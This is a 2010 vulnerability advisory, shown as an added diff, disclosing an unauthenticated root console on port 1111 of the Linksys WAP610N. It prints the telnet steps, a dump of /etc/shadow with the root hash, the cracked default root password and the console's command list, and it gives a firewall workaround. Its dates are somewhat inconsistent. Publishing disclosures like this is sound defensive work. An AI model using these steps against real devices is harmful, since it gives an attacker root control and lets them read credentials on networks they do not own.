@@ -1,0 +1,149 @@
+Secure Network - Security Research Advisory
+
+Vuln name: Linksys WAP610N Unauthenticated Access With Root Privileges
+Systems affected: WAP610N (Firmware Version: 1.0.01)
+Systems not affected: --
+Severity: High
+Local/Remote: Remote
+Vendor URL: http://www.linksysbycisco.com
+Author(s): Matteo Ignaccolo m.ignaccolo () securenetwork it
+Vendor disclosure: 14/06/2010
+Vendor acknowledged: 14/06/2010
+Vendor bugfix: 14/12/2010 (reply to our request for update)
+Vendor patch release: ??
+Public disclosure: 10/02/2010
+Advisory number: SN-2010-08
+Advisory URL: 
+http://www.securenetwork.it/ricerca/advisory/download/SN-2010-08.txt
+
+
+*** SUMMARY ***
+
+Linksys WAP610N is a SOHO wireless access point supporting 802.11n draft.
+
+Unauthenticated remote textual administration console has been found that 
+allow an attacker to run system command as root user.
+
+
+*** VULNERABILITY DETAILS ***
+
+telnet <access-point IP> 1111
+
+Command> system id
+Output>  uid=0(root) gid=0(root)
+
+Coomand> system cat /etc/shadow
+Ouptup>  root:$1$ZAwqf2dI$ZukbihyQtUghNDsLAQaP31:10933:0:99999:7:::
+Ouptup>  bin:*:10933:0:99999:7:::
+Ouptup>  daemon:*:10933:0:99999:7:::
+Ouptup>  adm:*:10933:0:99999:7:::
+Ouptup>  lp:*:10933:0:99999:7:::
+Ouptup>  sync:*:10933:0:99999:7:::
+Ouptup>  shutdown:*:10933:0:99999:7:::
+Ouptup>  halt:*:10933:0:99999:7:::
+Ouptup>  uucp:*:10933
+
+root password is "wlan" (cracked with MDcrack http://mdcrack.openwall.net)
+
+List of console's command:
+
+ATHENA_READ
+ATHENA_WRITE
+CHIPVAR_GET
+DEBUGTABLE
+DITEM
+DMEM
+DREG16
+DREG32
+DREG8
+DRV_CAT_FREE
+DRV_CAT_INIT
+DRV_NAME_GET
+DRV_VAL_GET
+DRV_VAL_SET
+EXIT
+GENIOCTL
+GETMIB
+HELP
+HYP_READ       
+HYP_WRITE      
+HYP_WRITEBUFFER
+ITEM16
+ITEM32
+ITEM8
+ITEMLIST
+MACCALIBRATE
+MACVARGET
+MACVARSET
+MEM_READ
+MEM_WRITE
+MTAPI
+PITEMLIST
+PRINT_LEVEL
+PROM_READ
+PROM_WRITE
+READ_FILE
+REBOOT
+RECONF
+RG_CONF_GET
+RG_CONF_SET
+RG_SHELL
+SETMIB
+SHELL
+STR_READ
+STR_WRITE
+SYSTEM
+TEST32
+TFTP_GET
+TFTP_PUT
+VER
+
+
+*** EXPLOIT ***
+
+Attackers may exploit these issues through a common telnet client as explained 
+above.
+
+
+*** FIX INFORMATION ***
+
+No patch is available.
+
+*** WORKAROUNDS ***
+
+Put access points on separate wired network and filter network traffic to/from 
+1111 tcp port.
+
+
+*********************
+*** LEGAL NOTICES ***
+*********************
+
+Secure Network (www.securenetwork.it) is an information security company, 
+which provides consulting and training services, and engages in security 
+research and development. 
+
+We are committed to open, full disclosure of vulnerabilities, cooperating
+whenever possible with software developers for properly handling disclosure.
+
+This advisory is copyright 2009 Secure Network S.r.l. Permission is 
+hereby granted for the redistribution of this alert, provided that it is
+not altered except by reformatting it, and that due credit is given. It 
+may not be edited in any way without the express consent of Secure Network 
+S.r.l. Permission is explicitly given for insertion in vulnerability 
+databases and similars, provided that due credit is given to Secure Network.
+
+The information in the advisory is believed to be accurate at the time of 
+publishing based on currently available information. This information is
+provided as-is, as a free service to the community by Secure Network 
+research staff. There are no warranties with regard to this information. 
+Secure Network does not accept any liability for any direct, indirect,
+or consequential loss or damage arising from use of, or reliance on,
+this information.
+
+If you have any comments or inquiries, or any issue with what is reported 
+in this advisory, please inform us as soon as possible.
+
+E-mail: securenetwork () securenetwork it
+GPG/PGP key: http://www.securenetwork.it/pgpkeys/Secure%20Network.asc
+Phone: +39 02 24 12 67 88
